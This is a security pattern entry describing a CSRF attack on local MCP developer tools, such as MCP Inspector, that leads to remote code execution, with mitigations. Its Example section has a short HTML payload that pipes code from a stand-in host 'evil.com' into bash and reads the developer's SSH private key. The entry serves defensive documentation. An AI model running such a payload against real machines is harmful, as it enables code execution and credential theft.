---
id: "TS-2026-0105"
title: "MCP Developer Tool CSRF to RCE"
category: "P4"
severity: "High"
description: "A malicious website exploits CSRF vulnerabilities in MCP developer tools (inspectors, debuggers) to achieve remote code execution on developer machines simply by visiting a crafted webpage."
date: "2026-02-26"
tags: ["mcp", "csrf", "rce", "developer-tools", "real-incident"]
---

## Overview

Inspired by **CVE-2025-49596** (MCP Inspector CSRF), this pattern describes how MCP development and debugging tools that expose local HTTP endpoints without CSRF protection can be exploited by malicious websites to execute arbitrary code on developer machines.

## Attack Vector

1. Developer runs an MCP debugging tool (inspector, test harness) with a local web UI
2. The tool exposes HTTP endpoints without CSRF tokens or origin checking
3. Developer visits a malicious webpage (or a legitimate page with injected ads)
4. The webpage makes cross-origin requests to the local MCP tool endpoints
5. The tool executes the requests, which can include arbitrary MCP tool invocations

## Impact

- **Remote code execution** via browser-based attack
- **No special access required** — attacker only needs the developer to visit a webpage
- **Bypasses network security** — attacks come from the developer's own browser
- **Developer tool trust** — tools often run with elevated privileges

## Real-World Reference

> **CVE-2025-49596**: CSRF vulnerability in MCP Inspector, a widely-used developer utility, enabled RCE by visiting a crafted webpage. ([Source](https://www.elastic.co/security-labs/mcp-tools-attack-defense-recommendations))

## Example

```html
<!-- Malicious webpage targeting local MCP Inspector -->
<img src="http://localhost:5173/api/tool/execute?name=shell&args=curl+evil.com/payload|bash" />
<script>
fetch('http://localhost:5173/api/tool/execute', {
  method: 'POST',
  body: JSON.stringify({tool: 'filesystem', action: 'read', path: '~/.ssh/id_rsa'})
});
</script>
```

## Mitigation

- All local development tools must implement CSRF protection
- Validate Origin/Referer headers on all local HTTP endpoints
- Require authentication tokens for tool execution endpoints
- Bind to localhost with random ports to reduce predictability
- Use WebSocket with token auth instead of plain HTTP endpoints

## See Also

- [TS-2026-0063](/skill/TS-2026-0063) — MCP Server Impersonation
- [TS-2026-0004](/skill/TS-2026-0004) — Command Injection via Skill-Provided Scripts
- [INC-005](/incidents) — MCP Inspector CSRF Incident
